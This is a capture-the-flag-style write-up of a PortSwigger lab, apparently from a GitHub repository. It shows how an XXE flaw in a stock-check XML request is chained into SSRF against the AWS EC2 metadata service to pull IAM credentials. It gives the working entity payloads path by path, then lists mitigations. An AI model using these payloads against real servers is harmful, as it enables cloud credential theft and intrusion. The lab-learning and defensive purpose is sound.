

### 📁 `README.md` — XXE to SSRF (EC2 Metadata Access)

# 📦 Exploiting XXE to Perform SSRF and Access EC2 Metadata

**🧪 Lab Level:** Apprentice  
**🔐 Vulnerability:** XXE → SSRF  
**✅ Status:** Solved  
**🛠 Platform:** PortSwigger Web Security Academy  
**🎯 Objective:** Exploit an XML External Entity (XXE) vulnerability to perform a Server-Side Request Forgery (SSRF) and extract AWS IAM secrets from the EC2 metadata service.

---

## 🔍 Lab Summary

This lab simulates an AWS EC2 environment where the vulnerable server has access to the instance metadata endpoint at `http://169.254.169.254/`.  
The goal is to exploit the XXE vulnerability to send an SSRF request to the metadata endpoint and retrieve the **IAM SecretAccessKey** from the metadata API.

---

## ⚙️ Exploitation Workflow

### 1. 🔎 Intercept the Request

Go to any product page and click **Check stock**. Intercept the request using Burp Suite. You’ll see an XML payload like:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId=“1”</storeId>
</stockCheck>
````

---

### 2. 💣 Inject the External Entity (XXE + SSRF)

Replace the payload with:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
<stockCheck>
  <productId>&xxe;</productId>
  <storeId>1</storeId>
</stockCheck>
```

This will return a directory listing, usually containing the folder `/latest`.

---

### 3. 🧭 Traverse the Metadata API

Iterate over the metadata paths to reach the IAM credentials:

#### Example payloads:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/">
```

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
```

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/">
```

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

Finally, when you find a role (e.g. `admin`), fetch the secret:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
```

✅ The response should include JSON like:

```json
{
  "Code": "Success",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYzEXAMPLEKEY",
  ...
}
```

---

## 🧠 Technical Insights

| Technique        | Description                                              |
| ---------------- | -------------------------------------------------------- |
| **XXE**          | Injecting a malicious DTD with external entity           |
| **SSRF**         | Redirecting server-side request to internal service      |
| **Metadata URL** | Default AWS internal endpoint: `http://169.254.169.254/` |
| **IAM Role**     | Exposed credentials used by the EC2 instance             |

---

## 🔐 Mitigations

* **Disable DTDs** in XML parsers
* **Restrict internal network access** from the XML parser
* **Use IAM instance profiles with least privilege**
* **Log and alert on internal metadata access**

---

## 📸 Screenshot (POC)

![XXE Metadata Lab Screenshot](https://github.com/Kabilala/xxe/blob/main/lab2/lab2.png)

---

## 🔗 References

* [📘 PortSwigger XXE Labs](https://portswigger.net/web-security/xxe)
* [🧠 SSRF + Metadata Explanation](https://hackerone.com/reports/312145)
* [🛡️ OWASP XXE Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)

---

## 👩‍💻 Author

**Kaouthar Belkebir**
Cybersecurity & Pentesting Enthusiast | PortSwigger Warrior | TryHackMe Explorer
🔗 [LinkedIn](https://www.linkedin.com/in/kaouthar-belkebir)
